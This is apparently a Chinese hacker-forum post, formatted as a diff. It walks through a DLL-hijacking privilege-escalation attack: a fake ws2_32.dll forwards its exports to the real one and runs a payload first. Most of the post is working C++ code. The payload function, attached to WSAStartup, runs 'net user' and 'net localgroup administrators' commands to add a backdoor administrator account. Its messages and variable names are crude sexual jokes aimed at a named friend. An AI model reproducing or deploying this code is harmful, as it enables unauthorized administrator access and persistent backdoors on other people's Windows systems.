@@ -1,0 +1,105 @@
+在水区看到了这个帖子，小帅黑客说他很有性趣。
+个人感觉提权用处不是很大，只是看起来比较猛而已。毕竟在Webshell下找一个可写的程序目录不是那么容易。而且对提权没太大的兴趣。
+不过小帅不停地：“我要！我要！”，还是给他写一个吧
+看名字就知道大概原理了，以前的木马有很多都是这个原理的。实际上这算是利用了windows寻找文件的一个特性，就是先在当前目录寻找需要调用的dll文件，如果没有找到那就再去系统目录下寻找，再没有就去环境变量中的目录中寻找。我们要做的就是伪造一个同名dll，并且伪造一张相同的输出表，伪造的DLL中把每个输出函数都跳转到真正的dll中。而在跳转之前我们就可以做爱做的事。
+OK了废话不多说，小帅非得让我给他写一个出来。好吧，来吧。
+因为C++多态，虚函数等特性。编译的时候输出函数的名字会被编译器改掉。所以要用
+#pragma comment(linker, "/EXPORT:DestinyFunc=MyFunc,@1") 
+来定义输出函数。
+毕竟那些输出函数都是假的，我们要转发，转发的话需要真实函数的地址。代码如下
+HMODULE m_hModule = NULL;// 原始模块句柄
+DWORD m_dwReturn[500] = {0};// 原始函数返回地址
+// 加载原始模块
+inline BOOL WINAPI Load()
+{
+TCHAR tzPath[MAX_PATH];
+TCHAR tzTemp[MAX_PATH * 2];
+
+GetSystemDirectory(tzPath, MAX_PATH);
+lstrcat(tzPath, TEXT("\\ws2_32.dll"));
+m_hModule = LoadLibrary(tzPath);
+if (m_hModule == NULL)
+{
+wsprintf(tzTemp, TEXT("无法加载 %s，程序无法正常运行。"), tzPath);
+MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP);
+}
+
+return (m_hModule != NULL);
+}
+
+// 释放原始模块
+inline VOID WINAPI Free()
+{
+if (m_hModule)
+{
+FreeLibrary(m_hModule);
+}
+}
+
+// 获取原始函数地址
+FARPROC WINAPI GetAddress(PCSTR pszProcName)
+{
+FARPROC fpAddress;
+CHAR szProcName[16];
+TCHAR tzTemp[MAX_PATH];
+
+if (m_hModule == NULL)
+{
+if (Load() == FALSE)
+{
+ExitProcess(-1);
+}
+}
+
+fpAddress = GetProcAddress(m_hModule, pszProcName);
+if (fpAddress == NULL)
+{
+if (HIWORD(pszProcName) == 0)
+{
+wsprintf(szProcName, "%d", pszProcName);
+pszProcName = szProcName;
+}
+
+wsprintf(tzTemp, TEXT("无法找到函数 %hs，程序无法正常运行。"), pszProcName);
+MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP);
+ExitProcess(-2);
+}
+
+return fpAddress;
+}
+OK了，可以找到真正的输出函数地址了，那就把每个输出函数都单列出来转到真正的输出函数就可以了，但是不能光转啊，光转的话怎么做爱做的事啊，我们在转发之前写一个邪恶的函数HiJackThis();
+
+我的HiJackThis是这么写的，仅供参考，大家可以自由发挥啊
+void HiJackThis()
+{
+BOOL bIsXiaoShuaisAssholeReady;
+STARTUPINFO si = {sizeof(si)};
+PROCESS_INFORMATION pi;
+char* PutOffXiaoShuaisUnderwear = "net user XiaoShuai IsAHacker /add";
+char* StickIntoXiaoshuaisAsshole = "net localgroup administrators XiaoShuai /add";
+bIsXiaoShuaisAssholeReady = ::CreateProcess(NULL,PutOffXiaoShuaisUnderwear,NULL,NULL,FALSE,NULL,NULL,NULL,&si,&pi);
+if (!bIsXiaoShuaisAssholeReady)
+{
+MessageBox(NULL,"fuck xiaoshuai failed","fuck",MB_ICONSTOP);
+}
+MessageBox(NULL,"OK,We'v put down Xiaoshuais underwear","YiKu",MB_OK);
+CloseHandle(pi.hProcess);
+bIsXiaoShuaisAssholeReady = ::CreateProcess(NULL,StickIntoXiaoshuaisAsshole,NULL,NULL,FALSE,NULL,NULL,NULL,&si,&pi);
+if (!bIsXiaoShuaisAssholeReady)
+{
+MessageBox(NULL,"I can not stick into it","fuck",MB_ICONSTOP);
+}
+MessageBox(NULL,"OK,OK,We'v Fucked Xiaoshuai's Asshole","Yeah",MB_OK);
+CloseHandle(pi.hProcess);
+}  
+
+很简单，就不写注释了。只是启发思路用的。
+
+基本完活了，最后把每个输出函数都重写一下就OK了。在这里我用WSAStartup举例子，因为这个函数调用的很频繁，所以就搞他了
+ALCDECL AheadLib_WSAStartup(void)
+{
+HiJackThis();
+GetAddress("WSAStartup");
+__asm JMP EAX;
+} 
+编译，完事。
